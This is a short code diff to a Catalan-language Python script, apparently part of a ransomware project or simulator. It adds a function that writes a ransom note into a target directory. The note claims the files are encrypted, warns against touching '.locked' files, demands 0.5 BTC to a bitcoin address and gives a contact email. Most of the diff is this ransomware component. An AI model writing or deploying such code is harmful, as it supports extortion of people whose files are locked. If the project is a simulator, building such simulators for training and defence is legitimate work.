@@ -27,3 +27,21 @@ def llegir_logs():
             print(f.read())
     else:
         print("No hi ha logs disponibles.")
+
+def generar_nota_rescat(directori):
+    contingut = (
+        "HEM XIFRAT ELS TEUS FITXERS!\n\n"
+        "Per recuperar les teves dades, necessites la clau de desxifratge.\n"
+        "1. No intentis modificar els fitxers .locked.\n"
+        "2. Envia 0.5 BTC a l'adreca: bc1qxy2kgdy6jrsqx7644vvv\n"
+        "3. Un cop pagat, envia un correu a: support@simulador.com\n"
+    )
+
+    ruta_nota = os.path.join(directori, "INSTRUCCIONS_RECUPERACIO.txt")
+    
+    try:
+        with open(ruta_nota, "w", encoding="utf-8") as f:
+            f.write(contingut)
+        print(f"[+] Nota de rescat creada a: {ruta_nota}")
+    except Exception as e:
+        print(f"[X] ERROR CREANT LA NOTA: {e}")
